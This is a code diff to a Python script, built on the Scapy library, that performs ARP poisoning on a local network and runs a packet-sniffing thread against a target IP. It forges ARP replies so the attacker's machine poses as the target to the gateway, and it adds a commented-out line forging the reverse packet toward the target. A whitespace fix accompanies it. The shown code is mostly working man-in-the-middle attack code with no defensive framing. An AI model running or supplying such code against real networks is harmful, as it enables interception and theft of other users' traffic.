@@ -49,6 +49,8 @@ def arp_poison(target_ip="0.0.0.0", gateway_ip="0.0.0.0",
     localhost_MAC = gma()
     p = Ether(dst=gateway_mac) / ARP(hwlen=6, plen=4, op=2, psrc=target_ip, hwsrc=localhost_MAC, hwdst=gateway_mac,
                                      pdst=gateway_ip)
+    # p = Ether(dst=gma(ip=target_ip)) / ARP(hwlen=6, plen=4, op=2, psrc=gateway_ip, hwsrc=localhost_MAC,
+    #                                        hwdst=gma(ip=target_ip), pdst=target_ip)
     while True:
         # With each loop iteration, We check the current global time
         current_time = time.perf_counter()
@@ -136,7 +138,7 @@ def main():
         print("Started ARP Poisoning")
 
         # Defining the Packet Sniffing thread and starting it
-        sniff_thread = threading.Thread(target=sniff_data, args=([operation_duration,target_ip]))
+        sniff_thread = threading.Thread(target=sniff_data, args=([operation_duration, target_ip]))
         threads.append(sniff_thread)
         sniff_thread.start()
         print("Started Packet Sniffing")
